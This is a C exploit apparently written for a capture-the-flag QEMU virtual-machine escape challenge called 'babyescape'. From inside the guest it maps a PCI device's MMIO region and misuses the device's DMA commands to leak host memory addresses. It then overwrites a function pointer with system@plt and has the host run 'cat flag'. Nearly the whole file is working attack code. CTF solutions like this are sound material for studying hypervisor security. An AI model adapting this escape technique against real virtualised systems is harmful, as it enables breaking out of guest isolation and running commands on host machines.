#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <ctype.h>
#include <termios.h>
#include <assert.h>

#include <sys/types.h>
#include <sys/mman.h>
#include <sys/io.h>

char *mmio_base;
int pmio_base = 0xc040;

uint64_t cur_flag = 0x0;
uint64_t gva2gpa(void *addr)
{
    uint64_t page;
    int fd = open("/proc/self/pagemap", O_RDONLY);
    lseek(fd, ((uint64_t)addr >> 12 << 3), SEEK_SET);
    read(fd, &page, 8);
    return ((page & 0x7fffffffffffff) << 12) | ((uint64_t)addr & 0xfff);
}

void mmio_write(uint64_t addr, char value)
{
    *(char *)(mmio_base + addr) = value;
}

void mmio_write32(uint64_t addr, uint32_t value)
{
    *(uint32_t *)(mmio_base + addr) = value;
}

void mmio_write64(uint64_t addr, uint64_t value)
{
    *(uint64_t *)(mmio_base + addr) = value;
}

char mmio_read(uint64_t addr)
{
    return *((char *)(mmio_base + addr));
}

/*
void pmio_write(uint32_t addr, uint32_t value)
{
    outl(value, pmio_base + addr);
}

uint64_t pmio_read(uint32_t addr)
{
    return inl(pmio_base + addr);
}
*/

void write_io(size_t size, int addr, char *data)
{
    for (int i = 0; i < size; i++)
    {
        mmio_write(addr + i, data[i]);
    }
}

void read_io(size_t size, int addr, char *data)
{
    for (int i = 0; i < size; i++)
    {
        data[i] = mmio_read(addr + i);
    }
}

/* Capitalized functions are for babyescape */

// Read the device
char Read_dma_buf(uint64_t offset)
{
    uint32_t size = 8;
    mmio_read(offset);
}

// access 0x48 with size 4
void Set_sjtuctfState_flag(uint64_t flag)
{
    uint64_t val = cur_flag ^ flag;
    mmio_write32(0x48, val);
    cur_flag = flag;
}

// access addr <= 0x88, size 4 or 8
void Set_sjtuctfState_cnt(uint64_t cnt)
{
    mmio_write32(0x28, cnt);
}

// access 0x88 size 8
void Set_sjtuctfState_addr(uint64_t addr)
{
    mmio_write64(0x88, addr);
}

void Set_sjtuctfState_idx(uint64_t idx)
{
    mmio_write64(0x90, idx);
}

// size 8
void Cpu_memory_read_into_dma_buf(uint64_t addr, uint64_t dma_buf_offset, uint64_t cnt)
{

    assert((addr & 0xfff) == 0);

    Set_sjtuctfState_flag(0xDEAD);
    Set_sjtuctfState_addr(addr);
    Set_sjtuctfState_cnt(cnt);
    Set_sjtuctfState_idx(dma_buf_offset);

    mmio_write64(0x98, -1);
}

void Cpu_memory_write_from_dma_buf(uint64_t addr, uint64_t dma_buf_offset, uint64_t cnt)
{
    assert((addr & 0xfff) == 0);

    Set_sjtuctfState_flag(0xBEEF);
    Set_sjtuctfState_addr(addr);
    Set_sjtuctfState_cnt(cnt);
    Set_sjtuctfState_idx(dma_buf_offset);

    mmio_write64(0x98, -1);
}

// bss addr for address_space_memory. NOTICE: a offset is needed due to ASLR
void *_address_space_memory_addr = (void *)0x55555657AA60;
void *_cpu_physical_memory_rw_addr = (void *)0x0000555555C8D3B0;
void *_system_plt_addr = (void *)0x555555922CB0;
void *_logfile_buf_addr = (void *)0x000055555657E000;

int main()
{
    // init mmio
    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    assert(fd >= 0);

    mmio_base = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    assert(mmio_base != MAP_FAILED);

    // init pmio

    /*not used in babyescape
    iopl(3);
    */

    void *cpu_physical_memory_rw_hva = NULL;
    printf("[+] cpu_physical_rw_hva gva: %p\n", &cpu_physical_memory_rw_hva);
    printf("[+] cpu_physical_rw_hva gpa: %p\n", (void *)gva2gpa(&cpu_physical_memory_rw_hva));

    // buf is used to get a address with 0x000 in the end
    char *buf = malloc(0x1000);
    memset(buf, 0, 0x1000);
    char *opaque_dst_addr = (void *)((uint64_t)(buf + 0xfff) & ~0xfff);

    printf("[+] opaque->addr gva: %p\n", opaque_dst_addr);
    printf("[+] opaque->addr gpa: %p\n", (void *)gva2gpa(opaque_dst_addr));
    Cpu_memory_write_from_dma_buf(gva2gpa(opaque_dst_addr), 0x1a80 - 0x0a60, 8); // struct offset
    cpu_physical_memory_rw_hva = *(void **)opaque_dst_addr;

    printf("[+] cpu_physical_rw_hva: %p\n", cpu_physical_memory_rw_hva);

    void *system_plt_addr = (void *)((uint64_t)_system_plt_addr -
                                     (uint64_t)_cpu_physical_memory_rw_addr +
                                     (uint64_t)cpu_physical_memory_rw_hva);
    printf("[+] system_plt_addr: %p\n", system_plt_addr);

    printf("[-] begin to leak somewhat heap address\n");

    // leak a heap address at &p +0x30
    void *somewhat_heap_hva = NULL;
    Cpu_memory_write_from_dma_buf(gva2gpa(opaque_dst_addr), 0x1a80 - 0x0a60 + 0x20, 8); // struct offset
    somewhat_heap_hva = *(void **)opaque_dst_addr;
    printf("[+] somewhat_heap_hva: %p\n", somewhat_heap_hva);

    // in local enviroment, somewhat_heap_hva = 0x58b9e331b6a0
    // while &p = 0x58b9e331d120
    // In docker , somewhat_heap_hva = 5c96903bfaa0
    // while &p = 0x5c96903c15b0
    void *_somewhat_heap_hva = (void *)0x5c96903bfaa0;
    void *_opaque_p_hva = (void *)0x5c96903c15b0;

    void *opaque_p_hva = (void *)((uint64_t)somewhat_heap_hva +
                                  ((uint64_t)_opaque_p_hva -
                                   (uint64_t)_somewhat_heap_hva));

    printf("[+] opaque_p_hva: %p\n", opaque_p_hva);

    void *opaque_dma_buf_addr = (void *)((uint64_t)opaque_p_hva - (0x1a80 - 0x0a60));
    printf("[+] opaque_dma_buf_addr: %p\n", opaque_dma_buf_addr);

    // Set cmdline.
    char *cmdline = "cat flag";
    memcpy(opaque_dst_addr, cmdline, 9);
    void *opaque_dma_buf_dst = (void *)(((uint64_t)opaque_dma_buf_addr + 0xfff) & ~0xfff);
    Cpu_memory_read_into_dma_buf(gva2gpa(opaque_dst_addr), opaque_dma_buf_dst - opaque_dma_buf_addr, 9); // strlen = 8

    // overwrite function ptr. system_plt_addr <- cpu_physical_rwxxxxxxxxx
    *(void **)opaque_dst_addr = system_plt_addr;
    Cpu_memory_read_into_dma_buf(gva2gpa(opaque_dst_addr), 0x1a80 - 0x0a60, 8);

    // Trigger system
    Cpu_memory_read_into_dma_buf((uint64_t)opaque_dma_buf_dst, 0, 0); // Hard-coded address. I dont know how to leak it deterministically.

    free(buf);
}